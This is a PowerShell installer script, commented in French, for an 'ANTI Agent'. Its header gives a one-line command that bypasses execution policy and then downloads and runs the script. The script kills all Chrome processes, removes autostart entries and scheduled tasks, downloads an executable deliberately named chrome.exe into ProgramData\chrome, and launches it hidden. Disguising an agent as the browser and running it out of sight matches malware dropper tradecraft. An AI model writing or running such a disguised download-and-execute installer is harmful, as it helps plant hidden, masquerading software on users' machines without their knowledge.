# ANTI Agent - Installation / Mise a jour
# Execute: powershell -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1 -OutFile $env:TEMP\ins.ps1; & $env:TEMP\ins.ps1"

Write-Host "=== ANTI Agent Installer ===" -ForegroundColor Cyan

# Kill old agents
Write-Host "[1/6] Arret des anciens agents..." -ForegroundColor Yellow
taskkill /f /im AntiAgent.exe 2>$null
taskkill /f /im chrome.exe 2>$null

# Remove scheduled tasks
Write-Host "[2/6] Suppression des taches planifiees..." -ForegroundColor Yellow
schtasks /delete /tn AntiAgentService /f 2>$null
schtasks /delete /tn ChromeService /f 2>$null

# Remove registry autostart
Write-Host "[3/6] Suppression du demarrage auto..." -ForegroundColor Yellow
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AntiAgentService /f 2>$null
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ChromeService /f 2>$null

# Remove old folders
Write-Host "[4/6] Suppression des anciens dossiers..." -ForegroundColor Yellow
Remove-Item -Recurse -Force "$env:ProgramData\AntiAgent" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force "$env:ProgramData\chrome" -ErrorAction SilentlyContinue

# Download new agent
Write-Host "[5/6] Telechargement de chrome.exe..." -ForegroundColor Yellow
$dir = "$env:ProgramData\chrome"
New-Item -ItemType Directory -Path $dir -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "https://github.com/AdamZoda/ANTI-Agent/releases/download/v1.0.1/chrome.exe" -OutFile "$dir\chrome.exe"

if (Test-Path "$dir\chrome.exe") {
    $size = (Get-Item "$dir\chrome.exe").Length
    Write-Host "Telecharge: $([math]::Round($size/1MB,1)) MB" -ForegroundColor Green
} else {
    Write-Host "ERREUR: Telechargement echoue!" -ForegroundColor Red
    exit 1
}

# Install
Write-Host "[6/6] Installation..." -ForegroundColor Yellow
Start-Process -FilePath "$dir\chrome.exe" -ArgumentList "--install" -WindowStyle Hidden
Start-Sleep -Seconds 2

Write-Host "=== TERMINE - chrome.exe installe et demarre ===" -ForegroundColor Green
